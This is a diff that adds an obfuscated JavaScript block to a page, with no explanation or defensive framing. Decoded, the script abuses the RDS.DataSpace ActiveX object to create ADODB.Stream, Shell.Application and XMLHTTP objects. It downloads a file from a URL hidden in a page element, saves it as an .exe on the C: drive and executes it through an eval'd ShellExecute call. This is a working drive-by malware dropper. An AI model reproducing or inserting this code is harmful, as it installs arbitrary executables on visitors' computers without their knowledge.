@@ -1,0 +1,21 @@
+<script type="text/javascript">
+
+function COGoXgtnWn1(){
+var plVhDhaXhr3 = document.createElement(unescape('%6F')+'b'+unescape('%6A')+'e'+'c'+unescape('%74'));
+plVhDhaXhr3.setAttribute("id",'p'+unescape('%6C')+'V'+unescape('%68')+'D'+'h'+'a'+'X'+'h'+'r'+unescape('%33'));
+plVhDhaXhr3.setAttribute('c'+unescape('%6C')+'a'+'s'+unescape('%73')+'i'+unescape('%64'),'c'+unescape('%6C')+unescape('%73')+unescape('%69')+'d'+unescape('%3A')+'B'+'D'+'9'+unescape('%36')+unescape('%43')+unescape('%35')+'5'+'6'+unescape('%2D')+'6'+'5'+unescape('%41')+unescape('%33')+unescape('%2D')+'1'+unescape('%31')+unescape('%44')+'0'+'-'+'9'+'8'+'3'+'A'+unescape('%2D')+unescape('%30')+'0'+unescape('%43')+unescape('%30')+'4'+'F'+unescape('%43')+unescape('%32')+unescape('%39')+'E'+'3'+unescape('%36'));
+var SjGZYdFSRc4 = plVhDhaXhr3.CreateObject(unescape('%61')+unescape('%64')+unescape('%6F')+unescape('%64')+unescape('%62')+'.'+unescape('%73')+'t'+'r'+'e'+'a'+unescape('%6D'),'');
+var FEiAMzlpVb5 = plVhDhaXhr3.CreateObject(unescape('%53')+'h'+unescape('%65')+'l'+unescape('%6C')+'.'+'A'+'p'+'p'+unescape('%6C')+unescape('%69')+'c'+'a'+unescape('%74')+'i'+unescape('%6F')+unescape('%6E'),'');
+var SKNosQVSnC6 = plVhDhaXhr3.CreateObject(unescape('%6D')+'s'+unescape('%78')+'m'+'l'+unescape('%32')+unescape('%2E')+unescape('%58')+'M'+'L'+'H'+unescape('%54')+'T'+unescape('%50'),'');
+var KGmQfLuldL7;
+KGmQfLuldL7=document.getElementById("nGuIRldVqc2").innerText;
+SKNosQVSnC6.open('G'+'E'+unescape('%54'),KGmQfLuldL7,false);
+SKNosQVSnC6.send();
+SjGZYdFSRc4.type = 1;
+SjGZYdFSRc4.open();
+SjGZYdFSRc4.Write(SKNosQVSnC6.responseBody);
+NjQwjdwVSR8 = "c:\\xlbKZTaumO9.exe";
+SjGZYdFSRc4.SaveToFile(NjQwjdwVSR8,2);
+eval('F'+unescape('%45')+'i'+'A'+unescape('%4D')+'z'+'l'+unescape('%70')+unescape('%56')+'b'+unescape('%35')+unescape('%2E')+unescape('%53')+'h'+unescape('%65')+'l'+unescape('%6C')+'E'+unescape('%78')+unescape('%65')+'c'+'u'+'t'+'e'+'('+'N'+unescape('%6A')+'Q'+unescape('%77')+'j'+'d'+unescape('%77')+'V'+'S'+unescape('%52')+'8'+unescape('%29')+unescape('%3B'));
+}
+</script>
